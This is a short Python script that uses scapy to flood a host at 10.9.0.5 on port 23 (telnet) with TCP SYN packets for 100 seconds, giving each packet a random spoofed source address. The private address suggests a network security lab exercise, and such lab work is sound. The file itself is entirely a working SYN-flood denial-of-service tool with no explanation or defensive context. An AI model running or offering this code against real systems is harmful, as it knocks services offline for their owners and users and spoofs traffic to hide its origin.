#!/bin/env python3
from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits
import datetime
import time

first_time = datetime.datetime.now()
difference = 0

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S') # Let's also change the destination port

pkt = ip/tcp

while difference < 100: #seconds
	later_time = datetime.datetime.now()
	difference = (later_time - first_time).seconds
	pkt[IP].src = str(IPv4Address(getrandbits(32))) #random source iP
	send(pkt, verbose = 0)
